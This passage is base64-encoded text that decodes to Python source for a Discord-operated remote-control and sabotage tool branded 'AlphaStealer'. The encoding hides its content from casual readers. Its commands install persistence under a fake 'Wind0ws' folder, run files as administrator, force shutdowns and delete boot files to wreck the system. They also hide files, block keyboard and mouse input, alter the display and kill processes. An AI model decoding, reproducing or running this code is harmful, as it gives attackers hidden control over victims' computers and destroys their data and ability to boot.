EJ5IEFscGhhU3RlYWxlcicpDQogICAgICAgIHJldHVybg0KDQogICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj0nVHJ5aW5nIHRvIGV4ZWN1dGUgdGhlIGZpbGUuJywgY29sb3I9MHhGRjAwMDApDQogICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCg0KICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PW9wZW5fZmlsZSwgYXJncz0oZmlsZXBhdGgsIGN0eCksIGRhZW1vbj1UcnVlKS5zdGFydCgpDQoNCkBib3QuY29tbWFuZChuYW1lPSdhZG1pbicpDQphc3luYyBkZWYgYWRtaW4oY3R4LCAqLCBmaWxlcGF0aDogc3RyKToNCiAgICBpZiBub3Qgb3MucGF0aC5pc2ZpbGUoZmlsZXBhdGgpOg0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdUaGUgZmlsZSBkb2VzIG5vdCBleGlzdC4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgICAgIHJldHVybg0KDQogICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj0nQXR0ZW1wdGluZyB0byBleGVjdXRlIHRoZSBmaWxlIGFzIGFkbWluaXN0cmF0b3IuLi4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQogICAgbG9vcCA9IGFzeW5jaW8uZ2V0X2V2ZW50X2xvb3AoKQ0KICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PW9wZW5fZmlsZV9hZG1pbiwgYXJncz0oZmlsZXBhdGgsIGN0eCwgbG9vcCksIGRhZW1vbj1UcnVlKS5zdGFydCgpDQoNCmRlZiBJbnN0YWxsUGVyc2lzdGVuY2UoKToNCiAgICBQUk9DID0gUHJvY2Vzcy5uYW1lKCkNCiAgICBmb3IgcHJvYyBpbiBwc3V0aWwucHJvY2Vzc19pdGVyKFsncGlkJywgJ25hbWUnLCAnZXhlJ10pOg0KICAgICAgICBpZiBwcm9jLmluZm9bJ25hbWUnXSA9PSBQUk9DOg0KICAgICAgICAgICAgYnJlYWsNCiAgICBlbHNlOg0KICAgICAgICBwYXNzDQogICAgICAgIHN5cy5leGl0KDEpDQoNCiAgICBQcm9jUGF0aCA9IHByb2MuaW5mb1snZXhlJ10NCiAgICBGb2xkZXJQYXRoID0gb3MucGF0aC5kaXJuYW1lKFByb2NQYXRoKQ0KICAgIG9zLmNoZGlyKEZvbGRlclBhdGgpDQogICAgZGVzdGluYXRpb25EaXIgPSBvcy5wYXRoLmpvaW4ob3MuZ2V0ZW52KCdBUFBEQVRBJyksICdXaW5kMHdzJykNCg0KICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhkZXN0aW5hdGlvbkRpcik6DQogICAgICAgIG9zLm1ha2VkaXJzKGRlc3RpbmF0aW9uRGlyKQ0KICAgIGVsc2U6DQogICAgICAgIHBhc3MNCg0KICAgIGZpbGVzX3RvX2NvcHkgPSBbUFJPQywgJ3B5dGhvbjMxMS5kbGwnLCAncHl0aG9uMy5kbGwnXQ0KICAgIGxpYl9kaXIgPSAnbGliJw0KDQogICAgZm9yIGZpbGUgaW4gZmlsZXNfdG9fY29weToNCiAgICAgICAgc3JjID0gb3MucGF0aC5qb2luKEZvbGRlclBhdGgsIGZpbGUpDQogICAgICAgIGRlc3QgPSBvcy5wYXRoLmpvaW4oZGVzdGluYXRpb25EaXIsIGZpbGUpDQoNCiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoc3JjKToNCiAgICAgICAgICAgIHNodXRpbC5jb3B5KHNyYywgZGVzdCkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHBhc3MNCg0KICAgIGxpYl9zcmMgPSBvcy5wYXRoLmpvaW4oRm9sZGVyUGF0aCwgbGliX2RpcikNCiAgICBsaWJfZGVzdCA9IG9zLnBhdGguam9pbihkZXN0aW5hdGlvbkRpciwgbGliX2RpcikNCg0KICAgIGlmIG9zLnBhdGguZXhpc3RzKGxpYl9zcmMpIGFuZCBvcy5wYXRoLmlzZGlyKGxpYl9zcmMpOg0KICAgICAgICBzaHV0aWwuY29weXRyZWUobGliX3NyYywgbGliX2Rlc3QpDQogICAgZWxzZToNCiAgICAgICAgcGFzcw0KDQpAYm90LmNvbW1hbmQobmFtZT0ncGVyc2lzdGVuY2UnKQ0KYXN5bmMgZGVmIEFscGhhUGVyc2lzdGVuY2UoY3R4KToNCiAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1JbnN0YWxsUGVyc2lzdGVuY2UsIGRhZW1vbj1UcnVlKS5zdGFydCgpDQogICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj0nUGVyc2lzdGVuY2UgaW5zdGFsbGVkLicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgYXdhaXQgc3RhcnR1cChjdHgpDQoNCmRlZiBSdW5GdWNrZXIoKToNCiAgICBQYXRoRnVja2VyID0gZidDOlxcVXNlcnNcXHt1c2VybmFtZX1cXEFwcERhdGFcXGZ1Y2tlci5jbWQnDQogICAgc3VicHJvY2Vzcy5Qb3BlbihQYXRoRnVja2VyLCBzaGVsbD1UcnVlKQ0KDQpkZWYgUnVuS2lsbEJvb3QoKToNCiAgICBQYXRoS2lsbEJvb3QgPSBmJ0M6XFxVc2Vyc1xce3VzZXJuYW1lfVxcQXBwRGF0YVxca2lsbGJvb3QuY21kJw0KICAgIHN1YnByb2Nlc3MuUG9wZW4oUGF0aEtpbGxCb290LCBzaGVsbD1UcnVlKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0nZnVja2NvbXB1dGVyJykNCkBDaGVja0NhdGVnb3J5DQphc3luYyBkZWYgRnVja0NvbXB1dGVyKGN0eCk6DQogICAgaWYgUHJvdGVjdG9yOg0KICAgICAgICBhd2FpdCBjdHguc2VuZCgn4p2MIEVycm9yOiBQcm90ZWN0b3IgbW9kZSBlbmFibGVkLicpDQogICAgICAgIHJldHVybg0KICAgIG9zLmNoZGlyKGYnQzpcXFVzZXJzXFx7dXNlcm5hbWV9XFxBcHBEYXRhJykNCg0KICAgIHdpdGggb3BlbignZnVja2VyLmNtZCcsICd3JywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjoNCiAgICAgICAgZi53cml0ZSgnQGVjaG8gb2ZmXG5cbnNodXRkb3duLmV4ZSAtcyAtdCAxNCAtYyAiUkVUSVJFRCBCWSBBTFBIQVNURUFMRVIiICcpDQoNCiAgICB0aW1lLnNsZWVwKDAuMSkNCiAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1SdW5GdWNrZXIsIGRhZW1vbj1UcnVlKS5zdGFydCgpDQoNCiAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdGdWNrZXIgc3RhcnRlZC4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0na2lsbGJvb3QnKQ0KQENoZWNrQ2F0ZWdvcnkNCmFzeW5jIGRlZiBraWxsYm9vdChjdHgpOg0KICAgIGlmIFByb3RlY3RvcjoNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoJ+KdjCBFcnJvcjogUHJvdGVjdG9yIG1vZGUgZW5hYmxlZC4nKQ0KICAgICAgICByZXR1cm4NCiAgICBvcy5jaGRpcihmJ0M6XFxVc2Vyc1xce3VzZXJuYW1lfVxcQXBwRGF0YScpDQoNCiAgICB3aXRoIG9wZW4oJ2tpbGxib290LmNtZCcsICd3JywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjoNCiAgICAgICAgZi53cml0ZSgnQGVjaG8gb2ZmXG5cbmF0dHJpYiAtciAtcyAtaCBjOmF1dG9leGVjLmJhdFxuZGVsIGM6YXV0b2V4ZWMuYmF0XG5cbmF0dHJpYiAtciAtcyAtaCBjOmJvb3QuaW5pXG5kZWwgYzpib290LmluaVxuXG5hdHRyaWIgLXIgLXMgLWggYzpudGRsclxuZGVsIGM6bnRkbHJcblxuYXR0cmliIC1yIC1zIC1oIGM6d2luZG93c3dpbi5pbmlcbmRlbCBjOndpbmRvd3N3aW4uaW5pXG4nKQ0KDQogICAgdGltZS5zbGVlcCgwLjEpDQogICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9UnVuS2lsbEJvb3QsIGRhZW1vbj1UcnVlKS5zdGFydCgpDQoNCkBib3QuY29tbWFuZChuYW1lPSdjb3B5JykNCmFzeW5jIGRlZiBjb3B5KGN0eCwgc291cmNlOiBzdHIsIGRlc3RpbmF0aW9uOiBzdHIpOg0KICAgIHRyeToNCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHNvdXJjZSk6DQogICAgICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPWYnVGhlIGZpbGUgZG9lcyBub3QgZXhpc3QgYHtzb3VyY2V9YCcsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICAgICAgICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KICAgICAgICAgICAgcmV0dXJuDQoNCiAgICAgICAgaWYgb3MucGF0aC5pc2RpcihkZXN0aW5hdGlvbik6DQogICAgICAgICAgICBkZXN0X3BhdGggPSBvcy5wYXRoLmpvaW4oZGVzdGluYXRpb24sIG9zLnBhdGguYmFzZW5hbWUoc291cmNlKSkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGRlc3RfcGF0aCA9IGRlc3RpbmF0aW9uDQoNCiAgICAgICAgc2h1dGlsLmNvcHkyKHNvdXJjZSwgZGVzdF9wYXRoKQ0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPWYnRmlsZSBjb3BpZWQgc3VjY2Vzc2Z1bGx5LicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249ZidFcnJvciA0MDMuJywgY29sb3I9MHhGRjAwMDApDQogICAgICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0naGlkZScpDQphc3luYyBkZWYgaGlkZShjdHgsIGZpbGVwYXRoOiBzdHIpOg0KICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhmaWxlcGF0aCk6DQogICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249ZidUaGUgZmlsZSBvciBmb2xkZXIgZG9lcyBub3QgZXhpc3QuJywgY29sb3I9MHhGRjAwMDApDQogICAgICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KICAgICAgICByZXR1cm4NCg0KICAgIHRyeToNCiAgICAgICAgc3VicHJvY2Vzcy5ydW4oWydhdHRyaWInLCAnK2gnLCBmaWxlcGF0aF0sIGNoZWNrPVRydWUsIHNoZWxsPVRydWUpDQogICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249ZidGaWxlZCBoaWRlZCBzdWNjZXNzZnVsbHkuJywgY29sb3I9MHhGRjAwMDApDQogICAgICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KICAgIGV4Y2VwdCBzdWJwcm9jZXNzLkNhbGxlZFByb2Nlc3NFcnJvciBhcyBlOg0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPWYnRXJyb3IgNDA2LicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCg0KQGJvdC5jb21tYW5kKG5hbWU9J3Nob3cnKQ0KYXN5bmMgZGVmIHNob3coY3R4LCBmaWxlcGF0aDogc3RyKToNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoZmlsZXBhdGgpOg0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPWYnVGhlIGZpbGUgb3IgZm9sZGVyIGRvZXMgbm90IGV4aXN0LicsIGNvbG9yPTB4RkYwMDAwKQ0KICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICBhd2FpdCBjdHguc2VuZChlbWJlZD1lbWJlZCkNCiAgICAgICAgcmV0dXJuDQoNCiAgICB0cnk6DQogICAgICAgIHN1YnByb2Nlc3MucnVuKFsnYXR0cmliJywgJy1oJywgZmlsZXBhdGhdLCBjaGVjaz1UcnVlLCBzaGVsbD1UcnVlKQ0KICAgICAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPWYnRmlsZWQgc2hvd2VkIHN1Y2Nlc3NmdWxseS4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgZXhjZXB0IHN1YnByb2Nlc3MuQ2FsbGVkUHJvY2Vzc0Vycm9yIGFzIGU6DQogICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249ZidFcnJvciA0MDYuJywgY29sb3I9MHhGRjAwMDApDQogICAgICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0ncm90YXRlJykNCmFzeW5jIGRlZiByb3RhdGUoY3R4LCBhbmdsZTogaW50KToNCiAgICBpZiBhbmdsZSBub3QgaW4gWzAsIDkwLCAxODAsIDI3MF06DQogICAgICAgIGF3YWl0IGN0eC5zZW5kKCdgYGBVc2U6IC5yb3RhdGUgPDAvOTAvMTgwLzI3MD5gYGAnKQ0KICAgICAgICByZXR1cm4NCg0KICAgIHRyeToNCiAgICAgICAgc2NyZWVuID0gcm90YXRlc2NyZWVuLmdldF9wcmltYXJ5X2Rpc3BsYXkoKQ0KICAgICAgICBzY3JlZW4ucm90YXRlX3RvKGFuZ2xlKQ0KDQogICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J1NjcmVlbiByb3RhdGVkIHN1Y2Nlc3NmdWxseS4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICAgICAgZW1iZWQuc2V0X2Zvb3Rlcih0ZXh0PSdEZXZlbG9wZWQgQnkgQWxwaGFTdGVhbGVyJykNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQoNCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgIGF3YWl0IGN0eC5zZW5kKGYiT2N1cnJpw7MgdW4gZXJyb3IgYWwgaW50ZW50YXIgcm90YXIgbGEgcGFudGFsbGE6IHtlfSIpDQoNCmNsYXNzIERFVk1PREUoY3R5cGVzLlN0cnVjdHVyZSk6DQogICAgX2ZpZWxkc18gPSBbDQogICAgICAgICgiZG1EZXZpY2VOYW1lIiwgY3R5cGVzLmNfd2NoYXIgKiAzMiksDQogICAgICAgICgiZG1TcGVjVmVyc2lvbiIsIGN0eXBlcy5jX3VzaG9ydCksDQogICAgICAgICgiZG1Ecml2ZXJWZXJzaW9uIiwgY3R5cGVzLmNfdXNob3J0KSwNCiAgICAgICAgKCJkbVNpemUiLCBjdHlwZXMuY191c2hvcnQpLA0KICAgICAgICAoImRtRHJpdmVyRXh0cmEiLCBjdHlwZXMuY191c2hvcnQpLA0KICAgICAgICAoImRtRmllbGRzIiwgY3R5cGVzLmNfdWxvbmcpLA0KICAgICAgICAoImRtT3JpZW50YXRpb24iLCBjdHlwZXMuY19zaG9ydCksDQogICAgICAgICgiZG1QYXBlclNpemUiLCBjdHlwZXMuY19zaG9ydCksDQogICAgICAgICgiZG1QYXBlckxlbmd0aCIsIGN0eXBlcy5jX3Nob3J0KSwNCiAgICAgICAgKCJkbVBhcGVyV2lkdGgiLCBjdHlwZXMuY19zaG9ydCksDQogICAgICAgICgiZG1TY2FsZSIsIGN0eXBlcy5jX3Nob3J0KSwNCiAgICAgICAgKCJkbUNvcGllcyIsIGN0eXBlcy5jX3Nob3J0KSwNCiAgICAgICAgKCJkbURlZmF1bHRTb3VyY2UiLCBjdHlwZXMuY19zaG9ydCksDQogICAgICAgICgiZG1QcmludFF1YWxpdHkiLCBjdHlwZXMuY19zaG9ydCksDQogICAgICAgICgiZG1Db2xvciIsIGN0eXBlcy5jX3Nob3J0KSwNCiAgICAgICAgKCJkbUR1cGxleCIsIGN0eXBlcy5jX3Nob3J0KSwNCiAgICAgICAgKCJkbVlSZXNvbHV0aW9uIiwgY3R5cGVzLmNfc2hvcnQpLA0KICAgICAgICAoImRtVFRPcHRpb24iLCBjdHlwZXMuY19zaG9ydCksDQogICAgICAgICgiZG1Db2xsYXRlIiwgY3R5cGVzLmNfc2hvcnQpLA0KICAgICAgICAoImRtRm9ybU5hbWUiLCBjdHlwZXMuY193Y2hhciAqIDMyKSwNCiAgICAgICAgKCJkbUxvZ1BpeGVscyIsIGN0eXBlcy5jX3Nob3J0KSwNCiAgICAgICAgKCJkbUJpdHNQZXJQZWwiLCBjdHlwZXMuY191bG9uZyksDQogICAgICAgICgiZG1QZWxzV2lkdGgiLCBjdHlwZXMuY191bG9uZyksDQogICAgICAgICgiZG1QZWxzSGVpZ2h0IiwgY3R5cGVzLmNfdWxvbmcpLA0KICAgICAgICAoImRtRGlzcGxheUZsYWdzIiwgY3R5cGVzLmNfdWxvbmcpLA0KICAgICAgICAoImRtRGlzcGxheUZyZXF1ZW5jeSIsIGN0eXBlcy5jX3Vsb25nKSwNCiAgICAgICAgKCJkbUlDTU1ldGhvZCIsIGN0eXBlcy5jX3Vsb25nKSwNCiAgICAgICAgKCJkbUlDTUludGVudCIsIGN0eXBlcy5jX3Vsb25nKSwNCiAgICAgICAgKCJkbU1lZGlhVHlwZSIsIGN0eXBlcy5jX3Vsb25nKSwNCiAgICAgICAgKCJkbURpdGhlclR5cGUiLCBjdHlwZXMuY191bG9uZyksDQogICAgICAgICgiZG1SZXNlcnZlZDEiLCBjdHlwZXMuY191bG9uZyksDQogICAgICAgICgiZG1SZXNlcnZlZDIiLCBjdHlwZXMuY191bG9uZyksDQogICAgICAgICgiZG1QYW5uaW5nV2lkdGgiLCBjdHlwZXMuY191bG9uZyksDQogICAgICAgICgiZG1QYW5uaW5nSGVpZ2h0IiwgY3R5cGVzLmNfdWxvbmcpDQogICAgXQ0KDQpkZWYgc2V0X3Jlc29sdXRpb24od2lkdGgsIGhlaWdodCk6DQogICAgdXNlcjMyID0gY3R5cGVzLndpbmRsbC51c2VyMzINCiAgICBnZGkzMiA9IGN0eXBlcy53aW5kbGwuZ2RpMzINCg0KICAgIEVOVU1fQ1VSUkVOVF9TRVRUSU5HUyA9IC0xDQogICAgQ0RTX1VQREFURVJFR0lTVFJZID0gMQ0KICAgIERJU1BfQ0hBTkdFX1NVQ0NFU1NGVUwgPSAwDQogICAgRE1fUEVMU1dJRFRIID0gMHg4MDAwMA0KICAgIERNX1BFTFNIRUlHSFQgPSAweDEwMDAwMA0KDQogICAgZGV2bW9kZSA9IERFVk1PREUoKQ0KICAgIGRldm1vZGUuZG1TaXplID0gY3R5cGVzLnNpemVvZihERVZNT0RFKQ0KDQogICAgaWYgdXNlcjMyLkVudW1EaXNwbGF5U2V0dGluZ3NXKE5vbmUsIEVOVU1fQ1VSUkVOVF9TRVRUSU5HUywgY3R5cGVzLmJ5cmVmKGRldm1vZGUpKToNCiAgICAgICAgZGV2bW9kZS5kbVBlbHNXaWR0aCA9IHdpZHRoDQogICAgICAgIGRldm1vZGUuZG1QZWxzSGVpZ2h0ID0gaGVpZ2h0DQogICAgICAgIGRldm1vZGUuZG1GaWVsZHMgPSBETV9QRUxTV0lEVEggfCBETV9QRUxTSEVJR0hUDQoNCiAgICAgICAgcmVzdWx0ID0gdXNlcjMyLkNoYW5nZURpc3BsYXlTZXR0aW5nc1coY3R5cGVzLmJ5cmVmKGRldm1vZGUpLCBDRFNfVVBEQVRFUkVHSVNUUlkpDQoNCiAgICAgICAgaWYgcmVzdWx0ICE9IERJU1BfQ0hBTkdFX1NVQ0NFU1NGVUw6DQogICAgICAgICAgICByYWlzZSBFeGNlcHRpb24oZiJDaGFuZ2VEaXNwbGF5U2V0dGluZ3MgZmFpbGVkIHdpdGggY29kZSB7cmVzdWx0fSIpDQogICAgZWxzZToNCiAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCJFbnVtRGlzcGxheVNldHRpbmdzIGZhaWxlZCIpDQoNCkBib3QuY29tbWFuZChuYW1lPSdyZXNvbHV0aW9uJykNCmFzeW5jIGRlZiByZXNvbHV0aW9uKGN0eCwgcmVzOiBzdHIpOg0KICAgIHRyeToNCiAgICAgICAgd2lkdGgsIGhlaWdodCA9IG1hcChpbnQsIHJlcy5sb3dlcigpLnNwbGl0KCd4JykpDQogICAgICAgIHNldF9yZXNvbHV0aW9uKHdpZHRoLCBoZWlnaHQpDQogICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J1Jlc29sdXRpb24gY2hhbmdlZCBzdWNjZXNzZnVsbHkuJywgY29sb3I9MHhGRjAwMDApDQogICAgICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICBhd2FpdCBjdHguc2VuZChmJ0Vycm9yIGFsIGNhbWJpYXIgbGEgcmVzb2x1Y2nDs246IHtlfScpDQoNCmlucHV0X2Jsb2NrZWQgPSBGYWxzZQ0KDQpkZWYgYmxvY2tfaW5wdXQoKToNCiAgICBjdHlwZXMud2luZGxsLnVzZXIzMi5CbG9ja0lucHV0KFRydWUpDQoNCmRlZiB1bmJsb2NrX2lucHV0KCk6DQogICAgY3R5cGVzLndpbmRsbC51c2VyMzIuQmxvY2tJbnB1dChGYWxzZSkNCg0KQGJvdC5jb21tYW5kKG5hbWU9J2Jsb2NrYWxsJykNCmFzeW5jIGRlZiBibG9ja19pbnB1dF9jbWQoY3R4KToNCiAgICBpZiBQcm90ZWN0b3I6DQogICAgICAgIGF3YWl0IGN0eC5zZW5kKCfinYwgRXJyb3I6IFByb3RlY3RvciBtb2RlIGVuYWJsZWQuJykNCiAgICAgICAgcmV0dXJuDQogICAgZ2xvYmFsIGlucHV0X2Jsb2NrZWQNCiAgICBpbnB1dF9ibG9ja2VkID0gVHJ1ZQ0KICAgIGJsb2NrX2lucHV0KCkNCiAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGRlc2NyaXB0aW9uPSdLZXlib2FyZCBhbmQgbW91c2UgYmxvY2tlZC4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0ndW5sb2NrYWxsJykNCmFzeW5jIGRlZiB1bmJsb2NrX2lucHV0X2NtZChjdHgpOg0KICAgIGlmIFByb3RlY3RvcjoNCiAgICAgICAgYXdhaXQgY3R4LnNlbmQoJ+KdjCBFcnJvcjogUHJvdGVjdG9yIG1vZGUgZW5hYmxlZC4nKQ0KICAgICAgICByZXR1cm4NCiAgICBnbG9iYWwgaW5wdXRfYmxvY2tlZA0KICAgIGlucHV0X2Jsb2NrZWQgPSBGYWxzZQ0KICAgIHVuYmxvY2tfaW5wdXQoKQ0KICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT0nQ29tbWFuZCBTdWNjZXNzJywgZGVzY3JpcHRpb249J0tleWJvYXJkIGFuZCBtb3VzZSB1bmxvY2tlZC4nLCBjb2xvcj0weEZGMDAwMCkNCiAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPWVtYmVkKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0na2lsbCcpDQpAQ2hlY2tDYXRlZ29yeQ0KYXN5bmMgZGVmIGtpbGwoY3R4LCB0YXJnZXQ6IHN0cik6DQogICAga2lsbGVkID0gMA0KICAgIGlmIHRhcmdldC5pc2RpZ2l0KCk6DQogICAgICAgIHBpZCA9IGludCh0YXJnZXQpDQogICAgICAgIHRyeToNCiAgICAgICAgICAgIHByb2MgPSBwc3V0aWwuUHJvY2VzcyhwaWQpDQogICAgICAgICAgICBwcm9jLnRlcm1pbmF0ZSgpDQogICAgICAgICAgICBwcm9jLndhaXQodGltZW91dD0zKQ0KICAgICAgICAgICAgZW1iZWQgPSBkaXNjb3JkLkVtYmVkKHRpdGxlPSdDb21tYW5kIFN1Y2Nlc3MnLCBkZXNjcmlwdGlvbj1mJ1BJRCBQcm9jZXNzIEtpbGxlZDoge3BpZH0uJywgY29sb3I9MHhGRjAwMDApDQogICAgICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICAgICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgICAgIGV4Y2VwdCBwc3V0aWwuTm9TdWNoUHJvY2VzczoNCiAgICAgICAgICAgIGF3YWl0IGN0eC5zZW5kKGYi4p2MIE5vIGV4aXN0ZSBlbCBwcm9jZXNvIGNvbiBlbCBQSUQge3BpZH0uIikNCiAgICAgICAgZXhjZXB0IHBzdXRpbC5BY2Nlc3NEZW5pZWQ6DQogICAgICAgICAgICBhd2FpdCBjdHguc2VuZChmIvCfmqsgUGVybWlzbyBkZW5lZ2FkbyBwYXJhIG1hdGFyIFBJRCB7cGlkfS4iKQ0KICAgICAgICBleGNlcHQgRX